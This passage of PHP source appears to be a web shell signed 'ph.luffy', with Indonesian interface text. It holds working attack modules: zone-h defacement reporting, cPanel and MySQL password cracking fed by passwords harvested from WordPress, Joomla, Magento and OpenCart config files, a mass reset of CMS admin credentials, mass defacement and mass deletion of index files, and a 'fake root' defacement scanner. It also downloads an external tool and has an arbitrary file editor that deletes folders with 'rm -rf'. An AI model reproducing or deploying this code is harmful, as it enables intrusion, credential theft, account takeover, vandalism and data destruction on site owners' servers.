            if(isset($_POST['submit']) AND $_GET['do'] === "zoneh") {
                $nick     = $_POST['nick'];
                $domain = explode("\r\n", $_POST['url']);
                print "Defacer Onhold: <a href='http://www.zone-h.org/archive/notifier=$nick/published=0' target='_blank'>http://www.zone-h.org/archive/notifier=$nick/published=0</a><br>";
                print "Defacer Archive: <a href='http://www.zone-h.org/archive/notifier=$nick' target='_blank'>http://www.zone-h.org/archive/notifier=$nick</a><br><br>";
    
                foreach($domain as $no => $url) {
                    $no   = ($no+1).".";
                    $post = curl("http://www.zone-h.org/notify/single", TRUE, "defacer=$nick&domain1=$url&hackmode=1&reason=1&submit=Send");
                    if(preg_match("/color=\"red\">OK<\/font><\/li>/i", $post)) {
                        print "$no $url -> ".color(1, 2, "OK")."<br>";
                    } else {
                        print "$no $url -> ".color(1, 1, "ERROR")."<br>";
                    }
                }
            }
            else {
                print "<center><form method='post' action='?do=zoneh&dir=".path()."'>
                       Defacer: <br>
                       <input type='text' name='nick' size='50' value='phluffy'><br><br>
                       Domains: <br>
                       <textarea style='width: 450px; height: 150px;' name='url' placeholder='http://google.com/'></textarea><br>
                       <input style='background: transparent; color: #ffffff; border: 1px solid #ffffff; width: 460px;' type='submit' name='submit' value='Submit'>
                       </form></center>";
               }
        }
        elseif($_GET['do'] == 'cpanel') {
            if($_POST['crack']) {
                $usercp = explode("\r\n", $_POST['user_cp']);
                $passcp = explode("\r\n", $_POST['pass_cp']);
                $i = 0;
                foreach($usercp as $ucp) {
                    foreach($passcp as $pcp) {
                        $connect = mysql_connect('localhost', $ucp, $pcp);
                        if($connect) {
                            if($_SESSION[$ucp] && $_SESSION[$pcp]) {
                            } else {
                                $_SESSION[$ucp] = "1";
                                $_SESSION[$pcp] = "1";
                                if($ucp === '' || $pcp === '') {
                                    // 
                                } else {
                                    $i++;
                                    print "username (".color(1, 2, $ucp).") password (".color(1, 2, $pcp).") domain (";
                                    if(!function_exists('posix_getpwuid')) print color(1, 1, "Function is Disable by System!");
                                    if(!getdomainname()) print color(1, 1, "Can't get domain name");
                                    foreach(getdomainname() as $domain) {
                                        $userdomain = (object) @posix_getpwuid(@fileowner("/etc/valiases/$domain"));
                                        $userdomain = $userdomain->name;
                                        if($userdomain === $user) {
                                            print "<a href='http://$domain/' target='_blank'>".color(1, 2, $domain)."</a><br>";
                                            break;
                                        }
                                    }
                                    print (empty($domain)) ? color(1, 1, "Can't get domain name.") : color(1, 2, $domain);
                                    print ")<br>";
                                }
                            }
                            mysql_close($connect);
                        }
                    }
                }
                print ($i === 0) ? "" : "<p>".color(1, 3, "Success $i Cpanel by phluffy")."</p>";
            } else {
                print "<center>
                       <span>NB: CPanel Crack ini sudah auto get password ( pake db password ) maka akan work jika dijalankan di dalam folder <u>config</u> ( ex: /home/user/public_html/nama_folder_config )</span><br>
                       <form method='post'>
                       USER: <br>
                       <textarea style='width: 450px; height: 150px;' name='user_cp'>";
                print implode("\n", getuser());
                print "</textarea><br>
                       PASS: <br>
                       <span>Grab Password from Link Config:</span><br>
                       <input style='width: 425px; background: transparent; border: 1px solid #ffffff; color: #ffffff;' type='text' name='linkpass' placeholder='http://web.com/idx_config/'>
                       <input style='background: transparent; border: 1px solid #ffffff; color: #ffffff;' type='submit' name='submitlink' value='>>'>
                       <br>
                       <textarea style='width: 450px; height: 200px;' name='pass_cp'>";
                if(isset($_POST['submitlink'])) {
                    $getpass = $_POST['linkpass'];
                    $get = curl($_POST['linkpass']);
                    preg_match_all('/<a href="(.*?).txt">/', $get, $link);
                    foreach($link[1] as $link_config) {
                        $scandir[] = "$link_config.txt";
                    }
                }
                else {
                    $getpass = path();
                    $scandir = scandir($getpass);
                }
                $password = "";
                foreach($scandir as $files) {
                    $file = "$getpass/$files";
                    $config = file_get_contents($file);
                    if(preg_match("/WordPress/", $config)) {
                        $password .= getValue($config, "DB_PASSWORD', '", "'")."\n";
                    } 
                    elseif(preg_match("/JConfig|joomla/", $config)) {
                        $password .= getValue($config, "password = '", "'")."\n";
                    } 
                    elseif(preg_match("/Magento|Mage_Core/", $config)) {
                        $password .= getValue($config, "<password><![CDATA[", "]]></password>")."\n";
                    } 
                    elseif(preg_match("/panggil fungsi validasi xss dan injection/", $config)) {
                        $password .= getValue($config, 'password = "', '"')."\n";
                    } 
                    elseif(preg_match("/HTTP_SERVER|HTTP_CATALOG|DIR_CONFIG|DIR_SYSTEM/", $config)) {
                        $password .= getValue($config, "'DB_PASSWORD', '", "'")."\n";
                    } 
                    elseif(preg_match("/^[client]$/", $config)) {
                        preg_match("/password=(.*?)/", $config, $pass);
                        if(preg_match('/"/', $pass[1])) {
                            $pass[1] = str_replace('"', "", $pass[1]);
                            $password .= $pass[1]."\n";
                        } 
                        else {
                            $password .= $pass[1]."\n";
                        }
                    } 
                    elseif(preg_match("/cc_encryption_hash/", $config)) {
                        $password .= getValue($config, "db_password = '", "'")."\n";
                    }
                }
                print $password;
                print "</textarea><br>
                       <input style='background: transparent; color: #ffffff; border: 1px solid #ffffff; width: 460px;' type='submit' name='crack' value='Crack'>
                       </form></center>";
            }
        }
        elseif($_GET['do'] == 'mpc') {
            if($_POST['hajar']) {
                if(strlen($_POST['pass_baru']) < 6 OR strlen($_POST['user_baru']) < 6) {
                    print "username atau password harus lebih dari 6 karakter";
                } 
                else {
                    $user_baru = $_POST['user_baru'];
                    $pass_baru = md5($_POST['pass_baru']);
                    $conf = $_POST['config_dir'];
                    if(preg_match("/^http:\/\//", $conf) OR preg_match("/^https:\/\//", $conf)) {
                        $get = curl($conf);
                        preg_match_all('/<a href="(.*?).txt">/', $get, $link);
                        foreach($link[1] as $link_config) {
                            $scan_conf[] = "$link_config.txt";
                        }
                    }
                    else {
                        $scan_conf = scandir($conf);
                    }
                    foreach($scan_conf as $file_conf) {
                        $config = file_get_contents("$conf/$file_conf");
                        if(preg_match("/JConfig|joomla/",$config)) {
                            $dbhost = getValue($config,"host = '","'");
                            $dbuser = getValue($config,"user = '","'");
                            $dbpass = getValue($config,"password = '","'");
                            $dbname = getValue($config,"db = '","'");
                            $dbprefix = getValue($config,"dbprefix = '","'");
                            $prefix = $dbprefix."users";
                            $conn = mysql_connect($dbhost,$dbuser,$dbpass);
                            $db = mysql_select_db($dbname);
                            $q = mysql_query("SELECT * FROM $prefix ORDER BY id ASC");
                            $result = mysql_fetch_array($q);
                            $id = $result['id'];
                            $site = getValue($config,"sitename = '","'");
                            $update = mysql_query("UPDATE $prefix SET username='$user_baru',password='$pass_baru' WHERE id='$id'");
                            print "Config => ".$file_conf."<br>";
                            print "CMS => Joomla<br>";
                            if($site == '') {
                                print "Sitename => ".color(1, 1, "Can't get domain name")."<br>";
                            } 
                            else {
                                print "Sitename => $site<br>";
                            }
                            if(!$update OR !$conn OR !$db) {
                                print "Status => ".color(1, 1, mysql_error())."<br><br>";
                            } 
                            else {
                                print "Status => ".color(1, 2, "sukses edit user, silakan login dengan user & pass yang baru.")."<br><br>";
                            }
                            mysql_close($conn);
                        } elseif(preg_match("/WordPress/",$config)) {
                            $dbhost = getValue($config,"DB_HOST', '","'");
                            $dbuser = getValue($config,"DB_USER', '","'");
                            $dbpass = getValue($config,"DB_PASSWORD', '","'");
                            $dbname = getValue($config,"DB_NAME', '","'");
                            $dbprefix = getValue($config,"table_prefix  = '","'");
                            $prefix = $dbprefix."users";
                            $option = $dbprefix."options";
                            $conn = mysql_connect($dbhost,$dbuser,$dbpass);
                            $db = mysql_select_db($dbname);
                            $q = mysql_query("SELECT * FROM $prefix ORDER BY id ASC");
                            $result = mysql_fetch_array($q);
                            $id = $result[ID];
                            $q2 = mysql_query("SELECT * FROM $option ORDER BY option_id ASC");
                            $result2 = mysql_fetch_array($q2);
                            $target = $result2[option_value];
                            if($target == '') {
                                $url_target = "Login => ".color(1, 1, "Cant't get domain name")."<br>";
                            } 
                            else {
                                $url_target = "Login => <a href='$target/wp-login.php' target='_blank'><u>$target/wp-login.php</u></a><br>";
                            }
                            $update = mysql_query("UPDATE $prefix SET user_login='$user_baru',user_pass='$pass_baru' WHERE id='$id'");
                            print "Config => ".$file_conf."<br>";
                            print "CMS => Wordpress<br>";
                            print $url_target;
                            if(!$update OR !$conn OR !$db) {
                                print "Status => ".color(1, 1, mysql_error())."<br><br>";
                            } 
                            else {
                                print "Status => ".color(1, 2, "sukses edit user, silakan login dengan user & pass yang baru.")."<br><br>";
                            }
                            mysql_close($conn);
                        } 
                        elseif(preg_match("/Magento|Mage_Core/",$config)) {
                            $dbhost = getValue($config,"<host><![CDATA[","]]></host>");
                            $dbuser = getValue($config,"<username><![CDATA[","]]></username>");
                            $dbpass = getValue($config,"<password><![CDATA[","]]></password>");
                            $dbname = getValue($config,"<dbname><![CDATA[","]]></dbname>");
                            $dbprefix = getValue($config,"<table_prefix><![CDATA[","]]></table_prefix>");
                            $prefix = $dbprefix."admin_user";
                            $option = $dbprefix."core_config_data";
                            $conn = mysql_connect($dbhost,$dbuser,$dbpass);
                            $db = mysql_select_db($dbname);
                            $q = mysql_query("SELECT * FROM $prefix ORDER BY user_id ASC");
                            $result = mysql_fetch_array($q);
                            $id = $result[user_id];
                            $q2 = mysql_query("SELECT * FROM $option WHERE path='web/secure/base_url'");
                            $result2 = mysql_fetch_array($q2);
                            $target = $result2[value];
                            if($target == '') {
                                $url_target = "Login => ".color(1, 1, "Cant't get domain name")."<br>";
                            } 
                            else {
                                $url_target = "Login => <a href='$target/admin/' target='_blank'><u>$target/admin/</u></a><br>";
                            }
                            $update = mysql_query("UPDATE $prefix SET username='$user_baru',password='$pass_baru' WHERE user_id='$id'");
                            print "Config => ".$file_conf."<br>";
                            print "CMS => Magento<br>";
                            print $url_target;
                            if(!$update OR !$conn OR !$db) {
                                print "Status => ".color(1, 1, mysql_error())."<br><br>";
                            } 
                            else {
                                print "Status => ".color(1, 2, "sukses edit user, silakan login dengan user & pass yang baru.")."<br><br>";
                            }
                            mysql_close($conn);
                        } elseif(preg_match("/HTTP_SERVER|HTTP_CATALOG|DIR_CONFIG|DIR_SYSTEM/",$config)) {
                            $dbhost = getValue($config,"'DB_HOSTNAME', '","'");
                            $dbuser = getValue($config,"'DB_USERNAME', '","'");
                            $dbpass = getValue($config,"'DB_PASSWORD', '","'");
                            $dbname = getValue($config,"'DB_DATABASE', '","'");
                            $dbprefix = getValue($config,"'DB_PREFIX', '","'");
                            $prefix = $dbprefix."user";
                            $conn = mysql_connect($dbhost,$dbuser,$dbpass);
                            $db = mysql_select_db($dbname);
                            $q = mysql_query("SELECT * FROM $prefix ORDER BY user_id ASC");
                            $result = mysql_fetch_array($q);
                            $id = $result[user_id];
                            $target = getValue($config,"HTTP_SERVER', '","'");
                            if($target == '') {
                                $url_target = "Login => ".color(1, 1, "Cant't get domain name")."<br>";
                            } 
                            else {
                                $url_target = "Login => <a href='$target' target='_blank'><u>$target</u></a><br>";
                            }
                            $update = mysql_query("UPDATE $prefix SET username='$user_baru',password='$pass_baru' WHERE user_id='$id'");
                            print "Config => ".$file_conf."<br>";
                            print "CMS => OpenCart<br>";
                            print $url_target;
                            if(!$update OR !$conn OR !$db) {
                                print "Status => ".color(1, 1, mysql_error())."<br><br>";
                            } 
                            else {
                                print "Status => ".color(1, 2, "sukses edit user, silakan login dengan user & pass yang baru.")."<br><br>";
                            }
                            mysql_close($conn);
                        } 
                        elseif(preg_match("/panggil fungsi validasi xss dan injection/",$config)) {
                            $dbhost = getValue($config,'server = "','"');
                            $dbuser = getValue($config,'username = "','"');
                            $dbpass = getValue($config,'password = "','"');
                            $dbname = getValue($config,'database = "','"');
                            $prefix = "users";
                            $option = "identitas";
                            $conn = mysql_connect($dbhost,$dbuser,$dbpass);
                            $db = mysql_select_db($dbname);
                            $q = mysql_query("SELECT * FROM $option ORDER BY id_identitas ASC");
                            $result = mysql_fetch_array($q);
                            $target = $result[alamat_website];
                            if($target == '') {
                                $target2 = $result[url];
                                $url_target = "Login => ".color(1, 1, "Cant't get domain name")."<br>";
                                if($target2 == '') {
                                    $url_target2 = "Login => ".color(1, 1, "Cant't get domain name")."<br>";
                                } 
                                else {
                                    $cek_login3 = file_get_contents("$target2/adminweb/");
                                    $cek_login4 = file_get_contents("$target2/lokomedia/adminweb/");
                                    if(preg_match("/CMS Lokomedia|Administrator/", $cek_login3)) {
                                        $url_target2 = "Login => <a href='$target2/adminweb' target='_blank'><u>$target2/adminweb</u></a><br>";
                                    } 
                                    elseif(preg_match("/CMS Lokomedia|Lokomedia/", $cek_login4)) {
                                        $url_target2 = "Login => <a href='$target2/lokomedia/adminweb' target='_blank'><u>$target2/lokomedia/adminweb</u></a><br>";
                                    } 
                                    else {
                                        $url_target2 = "Login => <a href='$target2' target='_blank'><u>$target2</u></a> [ <font color=red>gatau admin login nya dimana :p</font> ]<br>";
                                    }
                                }
                            } else {
                                $cek_login = file_get_contents("$target/adminweb/");
                                $cek_login2 = file_get_contents("$target/lokomedia/adminweb/");
                                if(preg_match("/CMS Lokomedia|Administrator/", $cek_login)) {
                                    $url_target = "Login => <a href='$target/adminweb' target='_blank'><u>$target/adminweb</u></a><br>";
                                } 
                                elseif(preg_match("/CMS Lokomedia|Lokomedia/", $cek_login2)) {
                                    $url_target = "Login => <a href='$target/lokomedia/adminweb' target='_blank'><u>$target/lokomedia/adminweb</u></a><br>";
                                } 
                                else {
                                    $url_target = "Login => <a href='$target' target='_blank'><u>$target</u></a> [ <font color=red>gatau admin login nya dimana :p</font> ]<br>";
                                }
                            }
                            $update = mysql_query("UPDATE $prefix SET username='$user_baru',password='$pass_baru' WHERE level='admin'");
                            print "Config => ".$file_conf."<br>";
                            print "CMS => Lokomedia<br>";
                            if(preg_match("/Can't get domain name/", $url_target)) {
                                print $url_target2;
                            } 
                            else {
                                print $url_target;
                            }
                            if(!$update OR !$conn OR !$db) {
                                print "Status => ".color(1, 1, mysql_error())."<br><br>";
                            } 
                            else {
                                print "Status => ".color(1, 2, "sukses edit user, silakan login dengan user & pass yang baru.")."<br><br>";
                            }
                            mysql_close($conn);
                        }
                    }
                }
            } 
            else {
                print "<center>
                <h1>Mass Password Change</h1>
                <form method='post'>
                <input type='radio' name='config_type' value='dir' checked>DIR Config<input type='radio' name='config_type' value='link'>LINK Config<br>
                <input type='text' size='50' name='config_dir' value='".path()."'><br><br>
                Set User & Pass: <br>
                <input type='text' name='user_baru' value='ph.luffy' placeholder='user_baru'><br>
                <input type='text' name='pass_baru' value='ph.luffy' placeholder='pass_baru'><br>
                <input style='background: transparent; color: #ffffff; border: 1px solid #ffffff; width: 215px; margin: 5px auto;' type='submit' name='hajar' value='Hajar!'>
                </form></center>";
            }
        }
        elseif($_GET['do'] === "mass") {
            if($_POST['start']) {
                if($_POST['mass_type'] === 'singledir') {
                    print "<div style='margin: 5px auto; padding: 5px'>";
                    massdeface($_POST['d_dir'], $_POST['script'], $_POST['d_file']);
                    print "</div>";
                } 
                elseif($_POST['mass_type'] === 'alldir') {
                    print "<div style='margin: 5px auto; padding: 5px'>";
                    massdeface($_POST['d_dir'], $_POST['script'], $_POST['d_file'], "-alldir");
                    print "</div>";
                }
                elseif($_POST['mass_type'] === "delete") {
                    print "<div style='margin: 5px auto; padding: 5px'>";
                    massdelete($_POST['d_dir'], $_POST['d_file']);
                    print "</div>";
                }
            } 
            else {
                print "<center><form method='post'>
                       <font style='text-decoration: underline;'>_ph.luffy_:</font><br>
                       <input type='radio' name='mass_type' value='singledir' checked>Mass Deface Single Directory<input type='radio' name='mass_type' value='alldir'>Mass Deface All Directory<input type='radio' name='mass_type' value='delete'>Mass Delete File<br>
                       <span>( kosongkan 'Index File' jika memilih Mass Delete File )</span><br><br>
                       <font style='text-decoration: underline;'>Folder:</font><br>
                       <input type='text' name='d_dir' value='".path()."' style='width: 450px;' height='10'><br><br>
                       <font style='text-decoration: underline;'>Filename:</font><br>
                       <input type='text' name='d_file' value='index.php' style='width: 450px;' height='10'><br><br>
                       <font style='text-decoration: underline;'>Index File:</font><br>
                       <textarea name='script' style='width: 450px; height: 200px;'>Hacked by ph.luffy</textarea><br>
                       <input style='background: transparent; color: #ffffff; border: 1px solid #ffffff; width: 460px; margin: 5px auto;' type='submit' name='start' value='Mass'>
                       </form></center>";
            }
        }
        elseif($_GET['do'] == 'fakeroot') {
            ob_start();
            $site = explode("\r\n", $_POST['url']);
            $user = usergroup()->name;
            $file = $_POST['file'];
            if(!preg_match("#/home/$user/public_html#", $_SERVER['DOCUMENT_ROOT'])) die(color(1, 1, "Saya pikir server ini tidak menggunakan host bersama :("));
            
            
            if($_POST['reverse']) {
                if(!is_writable($_SERVER['DOCUMENT_ROOT'])) die(color(1, 1, "Directory '".$_SERVER['DOCUMENT_ROOT']."' is not writeable."));
                if(!is_writable(dirname($_SERVER['DOCUMENT_ROOT']))) die(color(1, 1, "Directory '".dirname($_SERVER['DOCUMENT_ROOT'])."' is not writeable."));
                save($_SERVER['DOCUMENT_ROOT']."/".$file, "w", $_POST['script']);
                save(dirname($_SERVER['DOCUMENT_ROOT'])."/".$file, "w", $_POST['script']);
                foreach($site as $url) {
                    $cek = curl("$url/~$user/$file");
                    if(preg_match("/hacked/i", $cek)) {
                        print "URL: <a href='$url/~$user/$file' target='_blank'>$url/~$user/$file</a> -> <font color=lime>Fake Root!</font><br>";
                    }
                }
            } else {
                print "<center><form method='post'>
                Filename: <br><input type='text' name='file' value='deface.html' size='50' height='10'><br>
                User: <br><input type='text' value='$user' size='50' height='10' readonly><br>
                Domain: <br>
                <textarea style='width: 450px; height: 250px;' name='url'>";
                print implode("\n", reverse());
                print "</textarea><br>
                <font style='text-decoration: underline;'>Index File:</font><br>
                <textarea name='script' style='width: 450px; height: 200px;'>Hacked by ph.luffy</textarea><br>
                <input style='background: transparent; color: #ffffff; border: 1px solid #ffffff; width: 460px; margin: 5px auto;' type='submit' name='reverse' value='Scan Fake Root!'>
                </form><br>
                NB: Sebelum gunain Tools ini , upload dulu file deface kalian di dir /home/user/ dan /home/user/public_html.</center>";
            }
        }
        elseif($_GET['do'] === 'lre') {
            if(file_exists("makman.php")) {
                print "<iframe src='http://".$_SERVER['HTTP_HOST']."/".$GLOBALS['FILEPATH']."/makman.php' frameborder='0' scrolling='yes'></iframe>";
            }
            else {
                if(!is_writable(path())) die(color(1, 1, "Directory '".path()."' is not writeable. Can't create file 'Makman'."));
                if(getfile("LRE")) {
                    print "<iframe src='http://".$_SERVER['HTTP_HOST']."/".$GLOBALS['FILEPATH']."/makman.php' frameborder='0' scrolling='yes'></iframe>";
                }
                else {
                    print color(1, 1, "Error while downloading file makman.");
                    @unlink("makman.php");
                }
            }
        }
    }
    elseif(isset($_GET['act'])) {
        if($_GET['act'] === 'newfile') {
            if($_POST['save']) {
                $filename = htmlspecialchars($_POST['filename']);
                $fopen    = fopen($filename, "a+");
                if($fopen) {
                    $act = "<script>window.location='?act=edit&dir=".path()."&file=".$_POST['filename']."';</script>";
                } 
                else {
                    $act = color(1, 1, "Permission Denied!");
                }
            }
            print $act;
            print "<form method='post'>
            Filename: <input type='text' name='filename' value='".path()."/newfile.php' style='width: 450px;' height='10'>
            <input type='submit' class='input' name='save' value='SUBMIT'>
            </form>";
        } 
        elseif($_GET['act'] === 'newfolder') {
            if($_POST['save']) {
                $foldername = path().'/'.htmlspecialchars($_POST['foldername']);
                if(!@mkdir($foldername)) {
                    $act = color(1, 1, "Permission Denied!");
                } 
                else {
                    $act = "<script>window.location='?dir=".path()."';</script>";
                }
            }
            print $act;
            print "<form method='post'>
            Folder Name: <input type='text' name='foldername' style='width: 450px;' height='10'>
            <input type='submit' class='input' name='save' value='SUBMIT'>
            </form>";
        } 
        elseif($_GET['act'] === 'rename_folder') {
            if($_POST['save']) {
                $rename_folder = rename(path(), "".dirname(path()).DIRECTORY_SEPARATOR.htmlspecialchars($_POST['foldername']));
                if($rename_folder) {
                    $act = "<script>window.location='?dir=".dirname(path())."';</script>";
                } 
                else {
                    $act = color(1, 1, "Permission Denied!");
                }
            print "$act<br>";
            }
            print "<form method='post'>
            <input type='text' value='".basename(path())."' name='foldername' style='width: 450px;' height='10'>
            <input type='submit' class='input' name='save' value='RENAME'>
            </form>";
        } 
        elseif($_GET['act'] === 'delete_folder') {
            if(is_dir(path())) {
                if(is_writable(path())) {
                    @rmdir(path());
                    if(!@rmdir(path()) AND OS() === "Linux") @exe("rm -rf ".path());
                    if(!@rmdir(path()) AND OS() === "Windows") @exe("rmdir /s /q ".path());
                    $act = "<script>window.location='?dir=".dirname(path())."';</script>";
                } 
                else {
                    $act = color(1, 1, "Could not remove directory '".basename(path())."'");
                }
            }
            print $act;
        } 
        elseif($_GET['act'] === 'view') {
            print "Filename: ".color(1, 2, basename($_GET['file']))." [".writeable($_GET['file'], perms($_GET['file']))."]<br>";
            print "[ <a href='?act=view&dir=".path()."&file=".$_GET['file']."'><b>view</b></a> ] [ <a href='?act=edit&dir=".path()."&file=".$_GET['file']."'>EdiT</a> ] [ <a href='?act=rename&dir=".path()."&file=".$_GET['file']."'>RenamE</a> ] [ <a href='?act=download&dir=".path()."&file=".$_GET['file']."'>InstalL</a> ] [ <a href='?act=delete&dir=".path()."&file=".$_GET['file']."'>delete</a> ]<br>";
            print "<textarea readonly>".htmlspecialchars(@file_get_contents($_GET['file']))."</textarea>";
        } 
        elseif($_GET['act'] === 'edit') {
            if($_POST['save']) {
                $save = file_put_contents($_GET['file'], $_POST['src']);
                if($save) {
                    $act = color(1, 2, "File Saved!");
                } 
                else {
                    $act = color(1, 1, "Permission Denied!");
                }
                print "$act<br>";
            }
            print "Filename: ".color(1, 2, basename($_GET['file']))." [".writeable($_GET['file'], perms($_GET['file']))."]<br>";
            print "[ <a href='?act=view&dir=".path()."&file=".$_GET['file']."'>LihaT</a> ] [ <a href='?act=edit&dir=".path()."&file=".$_GET['file']."'><b>EdiT</b></a> ] [ <a href='?act=rename&dir=".path()."&file=".$_GET['file']."'>RenamE</a> ] [ <a href='?act=download&dir=".path()."&file=".$_GET['file']."'>InstalL</a> ] [ <a href='?act=delete&dir=".path()."&file=".$_GET['file']."'>Delete</a> ]<br>";
            print "<form method='post'>
            <textarea name='src'>".htmlspecialchars(@file_get_contents($_GET['file']))."</textarea><br>
            <input type='submit' class='input' value='SAVE' name='save' style='width: 500px;'>
            </form>";
        } 
        elseif($_GET['act'] === 'rename') {
            if($_POST['save']) {
                $rename = rename($_GET['file'], path().DIRECTORY_SEPARATOR.htmlspecialchars($_POST['filename']));
                if($rename) {
                    $act = "<script>window.location='?dir=".path()."';</script>";
                } 
                else {
                    $act = color(1, 1, "Permission Denied!");
                }
                print "$act<br>";
            }
            print "Filename: ".color(1, 2, basename($_GET['file']))." [".writeable($_GET['file'], perms($_GET['file']))."]<br>";
            print "[ <a href='?act=view&dir=".path()."&file=".$_GET['file']."'>view</a> ] [ <a href='?act=edit&dir=".path()."&file=".$_GET['file']."'>EdiT</a> ] [ <a href='?act=rename&dir=".path()."&file=".$_GET['file']."'><b>RenamE</b></a> ] [ <a href='?act=download&dir=".path()."&file=".$_GET['file']."'>InstalL</a> ] [ <a href='?act=delete&dir=".path()."&file=".$_GET['file']."'>Delete</a> ]<br>";
            print "<form method='post'>
            <input type='text' value='".basename($_GET['file'])."' name='filename' style='width: 450px;' height='10'>
            <input type='submit' class='input' name='save' value='RENAME'>
            </form>";
        }
        elseif($_GET['act'] === 'delete') {
            $delete = unlink($_GET['file']);
            if($delete) {
                $act = "<script>window.location='?dir=".path()."';</script>";
            } 
            else {
                $act = color(1, 1, "Permission Denied!");
            }
            print $act;
        }
    }
    else {
        files_and_folder();
    }
}
serverinfo();
action();
?>
</body>
</html>

